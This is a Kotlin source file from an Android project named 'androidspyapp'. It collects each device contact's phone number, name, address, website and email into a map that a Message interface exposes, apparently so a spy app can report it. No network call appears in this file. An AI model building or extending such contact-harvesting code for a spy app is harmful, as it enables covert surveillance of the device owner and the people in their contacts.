package com.komnacki.androidspyapp.contacts

import android.content.Context
import android.util.Log
import com.komnacki.androidspyapp.Message


class ContactsState(override var context: Context) :
    Message {
    init {
        Log.d("KK: ", "ContactsState")
        getContactsState(
            context
        )
    }

    companion object {
        private val info: MutableMap<String, Any> = mutableMapOf()

        fun getContactsState(context: Context) {
            val importContacts = ImportContacts(context)
            importContacts.contacts.forEach { c ->
                if (c.numbers[0] != null && c.displaydName != null) {
                    val contact = Contact(
                        c.numbers[0].normalizedNumber,
                        if (c.firstName != null) c.firstName else "",
                        if (c.lastName != null) c.lastName else "",
                        if (c.displaydName != null) c.displaydName else "",
                        if (!c.addresses.isNullOrEmpty()) c.addresses[0].address else "",
                        if (!c.websites.isNullOrEmpty()) c.websites[0].website else "",
                        if (!c.emails.isNullOrEmpty()) c.emails[0].email else ""
                    )
                    val displayName = c.displaydName
                        .replace("/", " ")
                        .replace("#", " ")
                        .replace("\\", " ")
                        .replace(",", " ")
                        .replace(".", " ")
                        .replace("(", " ")
                        .replace(")", " ")
                        .replace(" ", "_")
                    info.put(displayName, contact)
                }
            }
        }
    }

    override fun getData(): Map<String, Any> {
        return info
    }
}